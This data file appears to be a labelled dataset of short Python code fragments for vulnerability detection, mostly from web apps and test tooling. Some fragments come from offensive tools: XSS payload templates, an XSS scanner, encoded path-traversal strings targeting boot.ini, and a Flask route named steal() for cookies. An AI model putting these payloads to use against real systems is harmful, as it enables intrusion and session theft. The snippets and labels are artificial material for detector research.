{"snippet_id": 45381, "code": "='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request,", "label": 0}, {"snippet_id": 27828, "code": " self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, status) else: if status==403 or status==401: self.render_forbidden(exception.message) else:", "label": 0}, {"snippet_id": 13711, "code": ".views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 5914, "code": "(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style", "label": 0}, {"snippet_id": 44993, "code": ": job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name", "label": 0}, {"snippet_id": 3747, "code": ".unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for", "label": 0}, {"snippet_id": 37103, "code": " reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %", "label": 0}, {"snippet_id": 33919, "code": "=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content", "label": 0}, {"snippet_id": 15422, "code": " self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org", "label": 0}, {"snippet_id": 3823, "code": " xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=',", "label": 0}, {"snippet_id": 40121, "code": "\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '", "label": 0}, {"snippet_id": 18578, "code": "'open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 39817, "code": "\t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname,", "label": 0}, {"snippet_id": 10637, "code": " test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest", "label": 0}, {"snippet_id": 42214, "code": " datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in", "label": 0}, {"snippet_id": 43979, "code": " data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(", "label": 0}, {"snippet_id": 46497, "code": " is_mobile=False): existing_hue_collections=DashboardController(request.user).get_search_collections() if request.GET.get('format')=='json': collections=[] for collection in existing_hue_collections: massaged_collection", "label": 0}, {"snippet_id": 39253, "code": " \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 10770, "code": ".serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs", "label": 0}, {"snippet_id": 46844, "code": "**kwargs) @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content=await self.content if not content", "label": 1}, {"snippet_id": 29490, "code": " not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class", "label": 0}, {"snippet_id": 34314, "code": " BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self", "label": 0}, {"snippet_id": 32523, "code": " server_bind(self): self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.bind(self.server_address) class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): path", "label": 0}, {"snippet_id": 32049, "code": " verbose_name=_(\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=", "label": 0}, {"snippet_id": 21987, "code": "'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]", "label": 0}, {"snippet_id": 17933, "code": "\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release", "label": 0}, {"snippet_id": 6624, "code": " DoS to consume all the IdP:s CPU resources if this is set to True. \"\"\" res=self.config.get(self.section, 'verify_request_signatures') return bool(int(res)) @property def status_test_usernames(self): \"\"\"", "label": 0}, {"snippet_id": 19048, "code": "\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):", "label": 0}, {"snippet_id": 48868, "code": "=dict(self.query_params).copy() for key, value in query.items(): if type(value)==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query", "label": 0}, {"snippet_id": 4617, "code": "'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', ", "label": 0}, {"snippet_id": 46691, "code": ".request.GET.items() if item in question_ids } if data: kwargs['data']=data return kwargs def form_valid(self, form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str", "label": 0}, {"snippet_id": 35474, "code": " docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch", "label": 0}, {"snippet_id": 47031, "code": " model views for records.\"\"\" import json from flask import flash from flask_admin.contrib.sqla import ModelView from flask_babelex import gettext as _ from invenio_admin.filters import FilterConverter from", "label": 0}, {"snippet_id": 53789, "code": " send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x", "label": 1}, {"snippet_id": 33812, "code": "\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields", "label": 0}, {"snippet_id": 18371, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 7908, "code": "'open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses", "label": 0}, {"snippet_id": 10590, "code": ".utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments", "label": 0}, {"snippet_id": 50064, "code": " allowedMethods=('POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self, failure, csessid, request): \"callback if a request is", "label": 0}, {"snippet_id": 31040, "code": " script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER", "label": 0}, {"snippet_id": 10503, "code": " '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls", "label": 0}, {"snippet_id": 14230, "code": ".ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site", "label": 0}, {"snippet_id": 1063, "code": ",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to", "label": 1}, {"snippet_id": 47573, "code": ", minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', text=str(profile.notes))) else: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField", "label": 0}, {"snippet_id": 14925, "code": " num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that", "label": 0}, {"snippet_id": 20162, "code": " def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in", "label": 0}, {"snippet_id": 35764, "code": "(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t", "label": 0}, {"snippet_id": 51686, "code": ", }, ] LANGUAGE_CODE='en-us' TIME_ZONE='UTC' USE_I18N=True USE_L10N=True USE_TZ=True LOCALE_PATHS=['locale'] LANGUAGE_COOKIE_NAME='dashboard_language' STATIC_URL='/static/' if DEBUG: STATIC_ROOT='static", "label": 0}, {"snippet_id": 17333, "code": "'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth", "label": 0}, {"snippet_id": 30471, "code": " grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') ", "label": 0}, {"snippet_id": 26764, "code": "/../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00", "label": 0}, {"snippet_id": 26354, "code": " 'your country is currently not available. We will therefore ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError", "label": 0}, {"snippet_id": 48055, "code": ": m: Media=Media() upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) low_res_file_name=upload_base_path", "label": 0}, {"snippet_id": 4437, "code": " import quote from saker.fuzzers.fuzzer import Fuzzer class Code(Fuzzer): \"\"\"Code Payload\"\"\" homograph={ 'a': '\\u0430', 'c': '\\u03F2', 'd': '\\u0501', 'e': '\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458", "label": 1}, {"snippet_id": 38162, "code": "\"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def", "label": 0}, {"snippet_id": 33141, "code": "/chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class MainHandler(webapp2.RequestHandler): \"\"\"Redirects to README.md.\"\"\" def get(self): return self.redirect(README_MD", "label": 0}, {"snippet_id": 51221, "code": "'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin", "label": 0}, {"snippet_id": 19878, "code": " self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store", "label": 0}, {"snippet_id": 1708, "code": "{ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body']", "label": 0}, {"snippet_id": 26078, "code": " 'required' in f.widget.attrs: del f.widget.attrs['required'] elif event.settings.invoice_address_company_required and not self.all_optional: self.initial['is_business']=True self.fields['is_business']", "label": 0}, {"snippet_id": 48713, "code": ") if \"rid\" in request.GET: if \"srid\" in request.GET: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response", "label": 0}, {"snippet_id": 50011, "code": "(settings.SESSION_ENGINE).SessionStore _RE_SCREENREADER_REGEX=re.compile(r\"%s\" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL +re.MULTILINE) _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder", "label": 0}, {"snippet_id": 53170, "code": " @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=", "label": 0}, {"snippet_id": 18614, "code": "'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\")", "label": 0}, {"snippet_id": 39751, "code": ".options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch", "label": 0}, {"snippet_id": 16873, "code": ", name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position", "label": 0}, {"snippet_id": 7703, "code": "/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name", "label": 1}, {"snippet_id": 4085, "code": "'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger", "label": 0}, {"snippet_id": 31738, "code": "\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create').split('.')[0] \tlist_name +='.lst' \tlist=os.path.dirname(os.getcwd())+\"", "label": 0}, {"snippet_id": 19867, "code": "'report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly',", "label": 0}, {"snippet_id": 42915, "code": "'.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype", "label": 0}, {"snippet_id": 9803, "code": "'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if", "label": 0}, {"snippet_id": 30101, "code": " \"add.py \t if form.getvalue('backend') is not None: \tfunct.show_backends(serv) \t if form.getvalue('ip') is not None and serv is not None: \tcommands=[ \"sudo ip a |grep inet |egrep -v '::1' |awk '{ print", "label": 0}, {"snippet_id": 37013, "code": " limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t", "label": 0}, {"snippet_id": 49466, "code": " def get_values(self): values=[] if isinstance(self.model_field, SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self", "label": 0}, {"snippet_id": 51146, "code": " obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return date class Meta:", "label": 0}, {"snippet_id": 3575, "code": " XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross", "label": 0}, {"snippet_id": 21182, "code": "\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views", "label": 0}, {"snippet_id": 3770, "code": " xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body", "label": 0}, {"snippet_id": 50455, "code": " return dataentries.pop(0) request.notifyFinish().addErrback(self._responseFailed, csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server", "label": 0}, {"snippet_id": 44395, "code": " request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete(", "label": 0}, {"snippet_id": 48672, "code": "(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else: return HttpResponseRedirect(\"/admin?error=noyb\") response: HttpResponseRedirect=HttpResponseRedirect(forward_url +\"?rid=\" +str(r", "label": 0}, {"snippet_id": 21587, "code": "[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$", "label": 0}, {"snippet_id": 9048, "code": "+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url", "label": 0}, {"snippet_id": 9516, "code": " name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses", "label": 0}, {"snippet_id": 53962, "code": "'\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif", "label": 0}, {"snippet_id": 20729, "code": "='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>", "label": 0}, {"snippet_id": 53784, "code": " >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for", "label": 1}, {"snippet_id": 45006, "code": ".find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render", "label": 0}, {"snippet_id": 21106, "code": "+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render", "label": 0}, {"snippet_id": 18931, "code": ".provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings", "label": 0}, {"snippet_id": 20505, "code": " github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg", "label": 0}, {"snippet_id": 43192, "code": "\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map", "label": 0}, {"snippet_id": 49649, "code": " element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model, '__str__',", "label": 0}, {"snippet_id": 54184, "code": " Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid", "label": 0}, {"snippet_id": 54222, "code": "=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=\"Crawl\",background='light sky blue').grid(row=8) Label(main", "label": 0}, {"snippet_id": 44900, "code": "]=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow", "label": 0}, {"snippet_id": 54624, "code": "(i.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a", "label": 1}, {"snippet_id": 45542, "code": "() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid", "label": 0}, {"snippet_id": 15133, "code": ".acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs", "label": 0}, {"snippet_id": 32457, "code": " This is actually a configurable string that is used as a replacement character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little sense", "label": 0}, {"snippet_id": 7082, "code": " url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib", "label": 0}, {"snippet_id": 48083, "code": "(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open(high_res_file_name, 'wb+') as destination: for chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size", "label": 0}, {"snippet_id": 52073, "code": ": json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id", "label": 1}, {"snippet_id": 33284, "code": "(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi, config_api.ConfigApi, swarmbucket_api.SwarmbucketApi, ] routes=[ webapp2.Route(r'/', MainHandler", "label": 0}, {"snippet_id": 36021, "code": "', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password", "label": 0}, {"snippet_id": 14517, "code": "', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404", "label": 0}, {"snippet_id": 51631, "code": "'NAME': os.environ.get('DB_NAME', 'dashboard'), 'USER': os.environ.get('DB_USER', 'dashboard'), 'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get('DB_HOST', 'mysql'), 'OPTIONS", "label": 0}, {"snippet_id": 2156, "code": "\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\"", "label": 0}, {"snippet_id": 3450, "code": "(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers)", "label": 0}, {"snippet_id": 23658, "code": " patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd", "label": 0}, {"snippet_id": 6962, "code": "\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard", "label": 0}, {"snippet_id": 54500, "code": " RequestContext from django.shortcuts import Http404, redirect, render, render_to_response from django.views.generic import ListView, DetailView from django.views.generic.edit import FormView, CreateView,", "label": 0}, {"snippet_id": 50846, "code": ": args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options\"].update({\"send_prompt\":", "label": 0}, {"snippet_id": 10091, "code": " expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 33601, "code": " Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe", "label": 0}, {"snippet_id": 46638, "code": "'life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self, request, *args, **kwargs)", "label": 0}, {"snippet_id": 46304, "code": ": True, 'collections': collections, 'layout':[ {\"size\":12,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\"", "label": 0}, {"snippet_id": 31658, "code": " source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t", "label": 0}, {"snippet_id": 4754, "code": "'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 